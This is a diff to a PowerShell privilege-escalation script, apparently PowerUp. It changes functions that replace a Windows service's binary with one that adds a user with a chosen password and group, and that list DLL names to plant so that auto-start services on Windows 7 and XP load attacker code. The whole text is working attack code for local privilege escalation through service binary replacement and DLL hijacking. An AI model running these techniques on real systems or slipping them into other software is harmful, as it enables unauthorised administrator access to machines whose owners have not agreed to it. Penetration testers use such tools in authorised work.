@@ -442,11 +442,11 @@ function Write-ServiceEXE {
     if ($TargetService){
         try{
 
-            $ServicePath = $TargetService.PathName
+            $ServicePath = $TargetService.PathName.Trim("`"")
             $BackupPath = $ServicePath + ".bak"
 
             Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
-            Copy-Item $ServicePath $BackupPath
+            Move-Item $ServicePath $BackupPath
 
             # write the proper service binary to the target path
             Write-UserAddServiceBinary -ServiceName $ServiceName -UserName $UserName -Password $Password -GroupName $GroupName -Path $ServicePath
@@ -501,7 +501,7 @@ function Restore-ServiceEXE {
     if ($TargetService){
         try{
 
-            $ServicePath = $TargetService.PathName
+            $ServicePath = $TargetService.PathName.Trim("`"")
             
             if ($BackupPath -eq $null -or $BackupPath -eq ''){
                 $BackupPath = $ServicePath + ".bak"
@@ -948,26 +948,63 @@ function Invoke-FindPathDLLHijack {
 
                 Write-Verbose "Windows 7 detected"
 
-                $out = New-Object System.Collections.Specialized.OrderedDictionary
-                $out.add('Service', 'IKEEXT')
-                $out.add('HijackablePath' ,$(Join-Path $Path "wlbsctrl.dll") )
-                $out
+                # check if the service are set to "auto"
+                $service = gwmi win32_service -Filter "Name='IKEEXT'"
+                if ($service -and ($service.StartMode -eq "Auto")){
+                    $out = New-Object System.Collections.Specialized.OrderedDictionary
+                    $out.add('Service', 'IKEEXT')
+                    $out.add('HijackablePath' ,$(Join-Path $Path "wlbsctrl.dll") )
+                    $out
+                }
+                $service = gwmi win32_service -Filter "Name='ehRecvr'"
+                if ($service -and ($service.StartMode -eq "Auto")){
+                    $out = New-Object System.Collections.Specialized.OrderedDictionary
+                    $out.add('Service', 'ehRecvr')
+                    $out.add('HijackablePath' ,$(Join-Path $Path "ehETW.dll") )
+                    $out
+                }
+                $service = gwmi win32_service -Filter "Name='ehSched'"
+                if ($service -and ($service.StartMode -eq "Auto")){
+                    $out = New-Object System.Collections.Specialized.OrderedDictionary
+                    $out.add('Service', 'ehSched')
+                    $out.add('HijackablePath' ,$(Join-Path $Path "ehETW.dll") )
+                    $out
+                }
 
             }
             elseif($OS -match '2600') {
 
                 Write-Verbose "Windows XP detected"
- 
-                $out = New-Object System.Collections.Specialized.OrderedDictionary
-                $out.add('Service', 'wuauserv')
-                $out.add('HijackablePath' ,$(Join-Path $Path "ifsproxy.dll") )
-                $out.add('Service', 'RDSessMgr')
-                $out.add('HijackablePath' ,$(Join-Path $Path "SalemHook.dll") )
-                $out.add('Service', 'RasMan')
-                $out.add('HijackablePath' ,$(Join-Path $Path "ipbootp.dll") )
-                $out.add('Service', 'winmgmt')
-                $out.add('HijackablePath' ,$(Join-Path $Path "wbemcore.dll") )           
-                $out
+
+                # check if the services are set to "auto"
+                $service = gwmi win32_service -Filter "Name='wuauserv'"
+                if ($service -and ($service.StartMode -eq "Auto")){
+                    $out = New-Object System.Collections.Specialized.OrderedDictionary
+                    $out.add('Service', 'wuauserv')
+                    $out.add('HijackablePath' ,$(Join-Path $Path "ifsproxy.dll") )
+                    $out
+                }
+                $service = gwmi win32_service -Filter "Name='RDSessMgr'"
+                if ($service -and ($service.StartMode -eq "Auto")){
+                    $out = New-Object System.Collections.Specialized.OrderedDictionary
+                    $out.add('Service', 'RDSessMgr')
+                    $out.add('HijackablePath' ,$(Join-Path $Path "SalemHook.dll") )
+                    $out
+                }
+                $service = gwmi win32_service -Filter "Name='RasMan'"
+                if ($service -and ($service.StartMode -eq "Auto")){
+                    $out = New-Object System.Collections.Specialized.OrderedDictionary
+                    $out.add('Service', 'RasMan')
+                    $out.add('HijackablePath' ,$(Join-Path $Path "ipbootp.dll") )
+                    $out
+                }
+                $service = gwmi win32_service -Filter "Name='winmgmt'"
+                if ($service -and ($service.StartMode -eq "Auto")){
+                    $out = New-Object System.Collections.Specialized.OrderedDictionary
+                    $out.add('Service', 'winmgmt')
+                    $out.add('HijackablePath' ,$(Join-Path $Path "wbemcore.dll") )
+                    $out
+                }
 
             }
             else {
